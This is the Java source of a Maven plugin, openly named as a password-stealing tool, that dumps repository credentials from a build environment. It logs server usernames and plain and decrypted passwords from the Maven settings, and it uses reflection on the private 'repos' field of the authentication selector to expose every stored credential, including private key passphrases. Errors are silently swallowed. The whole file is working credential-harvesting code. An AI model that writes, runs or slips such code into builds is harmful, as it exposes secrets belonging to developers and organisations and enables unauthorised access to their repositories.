package ninja.stealing.maven.password;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

import org.apache.maven.execution.MavenSession;
import org.apache.maven.plugin.AbstractMojo;
import org.apache.maven.plugin.MojoExecutionException;
import org.apache.maven.plugin.logging.Log;
import org.apache.maven.plugins.annotations.Component;
import org.apache.maven.plugins.annotations.Mojo;
import org.apache.maven.plugins.annotations.Parameter;
import org.apache.maven.project.MavenProject;
import org.apache.maven.settings.Server;
import org.apache.maven.settings.Settings;
import org.apache.maven.settings.building.SettingsProblem;
import org.apache.maven.settings.crypto.DefaultSettingsDecryptionRequest;
import org.apache.maven.settings.crypto.SettingsDecrypter;
import org.apache.maven.settings.crypto.SettingsDecryptionRequest;
import org.apache.maven.settings.crypto.SettingsDecryptionResult;
import org.eclipse.aether.repository.Authentication;
import org.eclipse.aether.repository.AuthenticationContext;
import org.eclipse.aether.repository.AuthenticationSelector;
import org.eclipse.aether.repository.RemoteRepository;
import org.eclipse.aether.util.repository.AuthenticationBuilder;

@Mojo(requiresProject = false, name = "dump")
public class PasswordExtract extends AbstractMojo {

	@Parameter(defaultValue = "${session}", readonly = true, required = true)
	private MavenSession session;
	@Parameter(defaultValue = "${settings}", readonly = true, required = true)
	private Settings settings;
	@Component(role = SettingsDecrypter.class)
	private SettingsDecrypter settingsDecrypter;
	private String[] authConField = { AuthenticationContext.USERNAME, AuthenticationContext.PASSWORD,
			AuthenticationContext.NTLM_DOMAIN, AuthenticationContext.NTLM_WORKSTATION,
			AuthenticationContext.PRIVATE_KEY_PATH, AuthenticationContext.PRIVATE_KEY_PASSPHRASE,
			AuthenticationContext.HOST_KEY_ACCEPTANCE, AuthenticationContext.HOST_KEY_REMOTE,
			AuthenticationContext.HOST_KEY_LOCAL, AuthenticationContext.SSL_CONTEXT,
			AuthenticationContext.SSL_HOSTNAME_VERIFIER };

	public void execute() throws MojoExecutionException {

		getLog().info("Dumping credentials and repositories");
		for (final Server server : settings.getServers()) {
		    // Get basic information from settings. Sometime password are not encrypted anyway.
			getLog().info("  Server " + server.getId());
			getLog().info("  - username: " + server.getUsername());
			getLog().info("  - password: " + server.getPassword());

			// First method to decrypt: the settingsDecrypter
			if (settingsDecrypter == null) {
				getLog().warn("  No settings decrypter found. Cant decrypt ...");
			} else {
				SettingsDecryptionRequest decryptionRequest = new DefaultSettingsDecryptionRequest(server);
				SettingsDecryptionResult decryptionResult = settingsDecrypter.decrypt(decryptionRequest);

				if (decryptionResult.getProblems().isEmpty()) {
					getLog().info("  - decrypted password: " + decryptionResult.getServer().getPassword());
				} else {
					for (SettingsProblem problem : decryptionResult.getProblems()) {
						getLog().warn("  settings problem for server " + server.getId() + " " + problem);
					}
				}
			}
			// Second method: build a repo builder and get the password from the context
			final RemoteRepository.Builder remoteRepoBuilder = new RemoteRepository.Builder(server.getId(), "default",
					"http://example.com");
			remoteRepoBuilder.setAuthentication(new AuthenticationBuilder().addUsername(server.getUsername())
					.addPassword(server.getPassword()).build());

			RemoteRepository remoteRepository = remoteRepoBuilder.build();
			AuthenticationContext authenticationContext = AuthenticationContext
					.forRepository(session.getRepositorySession(), remoteRepository);

			if (authenticationContext != null) {
				session.getRepositorySession().getAuthenticationSelector().getAuthentication(remoteRepository)
						.fill(authenticationContext, "password", null);
				getLog().info("  - username (expanded): " + authenticationContext.get("username"));
				getLog().info("  - password (expanded): " + authenticationContext.get("password"));

			} else {
				getLog().warn("  can't get an authentication context");
			}

		}

		// Method 1 and 2 rely on getting the password for a specific server
		// Even if we got the list of server from the settings object, on this method we
		// will try to dump all
		// "AuthenticationSelector" that a new repo may have access to.
		try {
			final RemoteRepository.Builder remoteRepoBuilder = new RemoteRepository.Builder("dummy", "default",
					"http://example.com");
			remoteRepoBuilder
					.setAuthentication(new AuthenticationBuilder().addUsername("dummy").addPassword("dummy").build());

			RemoteRepository remoteRepository = remoteRepoBuilder.build();
			AuthenticationContext dummyAuthenticationContext = AuthenticationContext
					.forRepository(session.getRepositorySession(), remoteRepository);

			dumpAuthenticationSelector(session.getRepositorySession().getAuthenticationSelector(),
					dummyAuthenticationContext);
		} catch (Exception e) {
			// Silently fail... like a ninja
		}

	}

	public void dumpAuthenticationSelector(AuthenticationSelector authenticationSelector,
			AuthenticationContext dummyAuthenticationContext)
			throws NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException {

		// Get the private field "repos" from the AuthenticationSelector
		Field repoField = authenticationSelector.getClass().getDeclaredField("repos");
		repoField.setAccessible(true);

		@SuppressWarnings("unchecked")
		HashMap<String, Authentication> repos = (HashMap<String, Authentication>) repoField.get(authenticationSelector);
		if (repos.entrySet().size() > 0) {
			getLog().info("Dumping authentication selector");
			for (Map.Entry<String, Authentication> repo : repos.entrySet()) {
				String key = repo.getKey();
				Authentication authentication = repo.getValue();
				getLog().info("  Repo " + key);
				// This will replace our "dummy" password with actual content
				authentication.fill(dummyAuthenticationContext, "useless", null);
				// Then we dump every field
				for (String field : authConField) {
					if (dummyAuthenticationContext.get(field) != null) {
						getLog().info("  - " + field + ":" + dummyAuthenticationContext.get(field));
					}
				}
			}
		}
	}
}
